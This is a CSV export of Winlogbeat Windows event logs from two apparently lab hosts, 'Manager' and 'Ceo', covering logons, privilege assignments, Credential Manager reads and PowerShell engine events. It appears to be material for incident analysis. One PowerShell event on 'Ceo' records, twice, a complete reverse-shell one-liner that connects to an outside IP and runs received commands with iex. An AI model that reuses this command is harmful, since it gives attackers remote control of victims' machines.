"Oct 23, 2022 @ 16:05:29.716",SHjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.863",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","WindowsLive:(cert):name=02xmqstzqqguctlc;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31156,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.715",RHjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.860",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","WindowsLive:(cert):name=02xmqstzqqguctlc;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31152,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.715",RXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.860",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,1,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",0,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","WindowsLive:target=virtualapp/didlogical","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31153,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.714",Q3jqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","User Account Management","-",5379,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.859",event,success,"Microsoft-Windows-Security-Auditing","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Credential Manager credentials were read.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-",4820,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","2022-10-23T08:05:29.6860997Z","%%8100","-",3221226021,"-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","-","-","-","WindowsLive:(token):name=02xmqstzqqguctlc;serviceuri=*","-","-","-","-","-","-",0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",5379,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31151,"User Account Management","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:29.685",QXjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:05:30.958","Oct 23, 2022 @ 16:16:26.858",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31149,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:05:29.685",QnjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:05:30.966","Oct 23, 2022 @ 16:16:26.859",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"7,524","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31150,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:05:16.723","63jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:05:17.419","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:16Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:16Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3899,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:04:46.662","6XjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:04:48.458","Oct 23, 2022 @ 16:16:15.917",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28768,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:04:46.662","6njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:04:48.458","Oct 23, 2022 @ 16:16:15.918",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,752,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28769,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:04:46.633","6HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:04:46.941","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3898,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:01:06.212","53jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 16:01:06.577","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=4c6317b2-30f0-4996-8a15-64187555cc92
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=d9620a6f-ee6b-4fd5-b304-3808fe6686a6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=4c6317b2-30f0-4996-8a15-64187555cc92
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=d9620a6f-ee6b-4fd5-b304-3808fe6686a6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4555,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:01:06.118","5njpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 16:01:06.573","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=c56c14e0-6bb5-4b13-b936-e0efe8f88f69
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=30ef7d0c-d52a-470b-8abc-36e0a1535325
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=c56c14e0-6bb5-4b13-b936-e0efe8f88f69
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=30ef7d0c-d52a-470b-8abc-36e0a1535325
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4554,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:39.594","5HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 15:58:41.184","Oct 23, 2022 @ 16:16:15.891",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
